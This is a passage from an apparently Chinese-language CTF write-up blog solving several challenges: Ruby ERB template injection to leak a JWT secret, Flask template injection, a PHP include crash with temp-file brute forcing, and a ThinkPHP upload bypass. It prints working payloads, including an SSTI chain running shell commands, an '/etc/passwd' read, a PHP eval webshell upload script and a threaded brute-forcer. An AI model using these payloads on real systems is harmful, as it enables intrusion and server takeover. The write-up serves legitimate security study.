class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>思路是JWT攻击 </p>
<p>测试：在 点击work的时候抓包，将 cookie:auth=xxx,进行jwt解码</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI<span class="number">1</span><span class="symbol">NiJ9</span>.eyJ<span class="number">1</span>aWQiOiJi<span class="symbol">NjVhZWI1</span>ZS<span class="number">1</span>h<span class="name">M2</span>Q<span class="number">2</span>LTQzMDAtYWI<span class="number">3</span>OS<span class="number">1</span>h<span class="symbol">NzUwNDI0</span>ODdhODgiLCJqa<span class="number">2</span>wiOjMwfQ<span class="number">.4</span>lbFDJBOCKb<span class="number">2</span>t<span class="number">5</span>cKmjl<span class="number">9</span>TStB<span class="symbol">nCiFLV5</span>A<span class="meta">O4</span><span class="symbol">Nny90</span>b<span class="number">67</span>U</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;b65aeb5e-a3d6-4300-ab79-a75042487a88&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jkl&quot;</span>: <span class="number">30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>确认思路，但是想要伪造jwt需要密钥SECRET</p>
<p>robots.txt 下发现路径，访问得到源码</p>
<p>重点看/work</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; algorithm: <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].<span class="keyword">match</span>(<span class="string">&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"> <span class="comment">//可以看出，cookie是需要ENV[&quot;SECRET&quot;]作为签名得到的。因此我们如果能得到每次work后的ENV[&quot;SECRET&quot;]，就可以伪造cookie了！这段代码的后半部分说明了，在ERB模版渲染以前有一个正则匹配。如果SECRET参数存在的话，就对其进行匹配，并用传入的值与ENV[&quot;SECRET&quot;]进行匹配，匹配成功就会输出FLAG</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[:<span class="keyword">do</span>] == <span class="string">&quot;#&#123;params[:name][0,7]&#125; is working&quot;</span> then</span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>当 <code>params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot;</code> ,secret会在 auth显示</p>
<p>所有我们要做的就是另<code>params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot;</code></p>
<p>这里有一串代码  <code>ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result</code>   为ERb模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。比如 name=&lt;%=1%&gt;，就会得 1。</p>
<p><strong>erb得模板注入形式如下</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= <span class="number">7</span> * <span class="number">7</span> %&gt;</span><br><span class="line">&lt;%= File.open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read %&gt;</span><br></pre></td></tr></table></figure>
<p><strong>但是题目只给了我们七个可控字符，除去这五个必要得字符，我们只能剩下2个字符可控</strong></p>
<p><strong>这里用到ruby全局变量</strong></p>
<p> <strong>ruby的全局变量以<code>$</code>开头，例如: <code>$x</code>,<code>$y</code> 。全局变量可以在程序的任何地方加以引用。全局变量无需变量声明。引用尚未初始化的全局变量时，其值为nil。并且ruby有内置的全局变量表，在<a target="_blank" rel="noopener" href="https://blog.csdn.net/zdq0394123/article/details/8443694">这里</a>。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu21.jpg"></p>
<p><strong>这里既然有匹配，那说明我们就可以用全局变量读出来了，也就是可以用上图的符号来读取匹配前的内容（即<code>ENV[&quot;SECRET&quot;]</code>）</strong></p>
<p><strong>因此我们可以构造，再进行url编码后传入。</strong></p>
<blockquote>
<p>?name=&lt;%=$’%&gt;&amp;do=&lt;%=$’%&gt; is working&amp;SECRET=</p>
<p>name=%3C%25=$’%25%3E&amp;do=%3C%25=$’%25%3E%20is%20working&amp;SECRET=</p>
</blockquote>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;script&gt;</span><span class="attribute">alert</span>(&#x27;<span class="number">02</span>a<span class="number">6945180</span>e<span class="number">332</span>ddf<span class="number">02</span>ba<span class="number">874</span>fc<span class="number">1</span>ae<span class="number">706</span>a<span class="number">43</span>e<span class="number">82</span>bd<span class="number">324</span>b<span class="number">47</span>fcbdac<span class="number">8208</span>f<span class="number">9</span>b<span class="number">5</span>dac<span class="number">1702</span>ba<span class="number">6280</span>a<span class="number">9</span>ad<span class="number">64798703</span>fd<span class="number">2</span>f<span class="number">3</span>b<span class="number">75</span>c<span class="number">8</span>b<span class="number">22</span>fa<span class="number">0390</span>b<span class="number">3</span>d<span class="number">6</span>c<span class="number">9</span>df<span class="number">18</span>c<span class="number">3</span>ad<span class="number">7</span>d<span class="number">3323</span>c<span class="number">195</span> working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>


<p>哪一长串数字就是secret ,拿到 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> ，伪造jwt即可，flag在buy flag后的cookie 里，还是拿jwt解密即为flag</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>知识点：</p>
<ol>
<li><strong>隐含参数查找</strong></li>
<li>常规flask模板注入</li>
<li>tplmap的使用</li>
</ol>
<p>题目不难，不过第一次遇到这种题型记录一下。</p>
<p><strong>一开始进去，发现这仿佛是一个静态的网页，没有传参没有交互。扫目录也没有任何信息泄露，入口都找不到咋做题…通过百度知道存在隐藏参数，这里用到一个隐藏参数查找的工具 Arjun</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu22.jpg"></p>
<p>通过工具，知道有参数name </p>
<p>接下去就是常规模板注入了</p>
<p>学到了利用CTRL + F 知道可利用类位置的小方法</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu23.jpg"></p>
<p>payload:</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>


<p>或者直接使用tplmap工具</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Usage: python tplmap.py [options]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -h, --help          显示帮助并退出</span><br><span class="line"></span><br><span class="line">目标:</span><br><span class="line">  -u URL, <span class="attribute">--url</span>=URL   目标 URL</span><br><span class="line">  -X REQUEST, --re<span class="built_in">..</span>  强制使用给定的HTTP方法 (e.g. PUT)</span><br><span class="line"></span><br><span class="line">请求:</span><br><span class="line">  -d DATA, <span class="attribute">--data</span>=..  通过POST发送的数据字符串 它必须作为查询字符串: <span class="attribute">param1</span>=value1&amp;param2=value2</span><br><span class="line">  -H HEADERS, --he<span class="built_in">..</span>  附加标头 (e.g. <span class="string">&#x27;Header1: Value1&#x27;</span>) 多次使用以添加新的标头</span><br><span class="line">  -c COOKIES, --co<span class="built_in">..</span>  Cookies (e.g. <span class="string">&#x27;Field1=Value1&#x27;</span>) 多次使用以添加新的Cookie</span><br><span class="line">  -A USER_AGENT, -<span class="built_in">..</span>  HTTP User-Agent 标头的值</span><br><span class="line">  <span class="attribute">--proxy</span>=PROXY       使用代理连接到目标URL</span><br><span class="line"></span><br><span class="line">检测:</span><br><span class="line">  <span class="attribute">--level</span>=LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)</span><br><span class="line">  -e ENGINE, --eng<span class="built_in">..</span>  强制将后端模板引擎设置为此值</span><br><span class="line">  -t TECHNIQUE, --<span class="built_in">..</span>  技术 R:渲染 T:基于时间的盲注 Default: RT</span><br><span class="line"></span><br><span class="line">操作系统访问:</span><br><span class="line">  <span class="attribute">--os-cmd</span>=OS_CMD     执行操作系统命令</span><br><span class="line">  --os-shell          提示交互式操作系统Shell</span><br><span class="line">  <span class="attribute">--upload</span>=UPLOAD     上传本地文件到远程主机</span><br><span class="line">  --force-overwrite   上传时强制覆盖文件</span><br><span class="line">  <span class="attribute">--download</span>=DOWNL..  下载远程文件到本地主机</span><br><span class="line">  <span class="attribute">--bind-shell</span>=BIN..  在目标的TCP端口上生成系统Shell并连接到它</span><br><span class="line">  <span class="attribute">--reverse-shell</span>=..  运行系统Shell并反向连接到本地主机端口</span><br><span class="line"></span><br><span class="line">模板检查:</span><br><span class="line">  --tpl-shell         在模板引擎上提示交互式Shell</span><br><span class="line">  <span class="attribute">--tpl-code</span>=TPL_C..  在模板引擎中注入代码</span><br><span class="line"></span><br><span class="line">常规:</span><br><span class="line">  <span class="attribute">--force-level</span>=FO..  强制将测试级别设置为此值</span><br><span class="line">  <span class="attribute">--injection-tag</span>=..  使用字符串作为注入标签 (default <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu24.jpg"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu25.jpg"></p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>知识点：</p>
<ol>
<li>LFI via SegmentFault</li>
<li>Hashpump</li>
</ol>
<p>ell**</p>
<p>先看看源码，发现提示为如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x2F;password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>非预期 :利用逻辑漏洞，传参?pass=(响应包中的Hash值)</p>
<p>预期解：通过hashpump猜测 secret 长度 ，可以手工也可以脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    data=os.popen(<span class="string">&#x27;hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k &#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; -a admin&#x27;</span>).read()</span><br><span class="line">    name=data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    result=requests.get(<span class="string">&#x27;http://192.168.0.166/index.php?name=&#x27;</span>+password+<span class="string">&#x27;&amp;pass=&#x27;</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>


<p>查看响应头</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">window</span>.location.href=<span class="string">&quot;flflflflag.php&quot;</span>;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问flflflflag.php</p>
<p><strong>这里可以用php7.0的bug</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php:<span class="regexp">//</span>filter<span class="regexp">/string.strip_tags/</span>resource=<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><strong>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&quot;&lt;?php eval($_POST[a]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://ad174df3-89cb-43d6-9e5b-ef88f8b1b19f.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>之后再访问dir.php （可以通过扫描器扫出来，不过我没扫出来…）页面，得到文件名</p>
<p><strong>这里讲下在不知道dir.php路径的前提下对文件名的爆破方法.  tmp file的文件名是有规律的，都叫<code>/tmp/php</code>再加上6位的大小写字母加上数字的随机组合，这个爆破量比较大，但是是可行的，贴个exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string,requests,threading,Queue</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters </span><br><span class="line">host = <span class="string">&quot;123.207.99.17&quot;</span> </span><br><span class="line">port = <span class="number">80</span> </span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ready</span>():</span></span><br><span class="line"></span><br><span class="line">	queue=Queue.Queue()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> charset: </span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> charset: </span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> charset: </span><br><span class="line">				<span class="keyword">for</span> l <span class="keyword">in</span> charset: </span><br><span class="line">					<span class="keyword">for</span> m <span class="keyword">in</span> charset: </span><br><span class="line">						<span class="keyword">for</span> n <span class="keyword">in</span> charset: </span><br><span class="line">							filename = i + j + k + l + m + n</span><br><span class="line">							<span class="built_in">print</span> <span class="string">&#x27;putting  &#x27;</span>+filename</span><br><span class="line">							queue.put(filename) </span><br><span class="line"></span><br><span class="line">	workers=[]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">		worker=threading.Thread(target=get,args=(queue,))</span><br><span class="line">		worker.start()</span><br><span class="line">		workers.append(worker)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">		worker.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">queue</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> queue.qsize()!=<span class="number">0</span>:</span><br><span class="line">			filename=queue.get(block=<span class="literal">False</span>)</span><br><span class="line">			brute_force_tmp_files(filename)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span>(<span class="params">filename</span>):</span> </span><br><span class="line">	url = <span class="string">&quot;%s/include.php?file=/tmp/php%s&quot;</span> % ( base_url, filename) </span><br><span class="line">	<span class="built_in">print</span> url </span><br><span class="line">	<span class="keyword">try</span>: </span><br><span class="line">		response = requests.get(url,timeout=<span class="number">2</span>) </span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(response.content)!=<span class="number">0</span>: </span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span> </span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;success.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				f.write(filename+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">		<span class="built_in">print</span> e </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span> </span><br><span class="line">	get_ready() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>接下去蚁剑连接即可，不过需要利用插件绕过disable_function ,flag在env下</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu26.jpg"></p>
<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>知识点：</p>
<ol>
<li>thinkphp控制器路由</li>
<li>ThinkPHP 上传文件名爆破</li>
<li>Think PHP upload()多文件上传</li>
<li>think\upload类是怎么生成文件名的</li>
</ol>
<p><strong>Think PHP上传默认路径是/home/index/upload</strong></p>
<p><strong>Think PHP upload()多文件上传：</strong></p>
<blockquote>
<p>think PHP里面的upload()函数在不穿参数的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传可以绕过文件后缀的检测，至于为什么上传两次1.txt，是为了获取php文件的后缀，因为这里的后缀命名方式运用了uniqid函数它是基于微妙的当前时间来更改文件名，两个同时上传生成的文件名相差不会太远。</p>
</blockquote>
<p><strong>ThinkPHP 上传文件名爆破</strong></p>
<blockquote>
<p> 这里的后缀命名方式运用了uniqid函数它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件名。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span 